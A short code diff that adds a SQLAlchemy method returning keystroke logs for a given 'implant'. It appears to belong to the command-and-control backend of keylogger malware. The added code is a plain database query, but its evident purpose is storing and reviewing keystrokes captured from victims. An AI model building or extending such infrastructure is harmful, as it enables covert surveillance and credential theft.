@@ -52,7 +52,27 @@ class Database:
             
             return [{"id": i.id, "firstconnected": i.firstconnected, "isactive": i.isactive} for i in implants]
     
+    def get_implant(self, implantid):
+        with self.Session() as s:
+            # Perform a join between Implant and Keylog tables
+            implantid = int(implantid)
+            results = (
+                s.query(Implant, Keylog)
+                .join(Keylog, Implant.id == Keylog.implantid)
+                .filter(Keylog.implantid == implantid)
+                .all()
+            )
 
+            # Process the results to return a list of dictionaries
+            keylogs = []
+            for _, keylog in results:
+                keylogs.append({
+                    "id": keylog.id,
+                    "text": keylog.text,
+                    "timestamp": keylog.timestamp
+                })
+
+            return keylogs
     def new_implant(self):
         with self.Session() as s:
             new_implant = Implant()
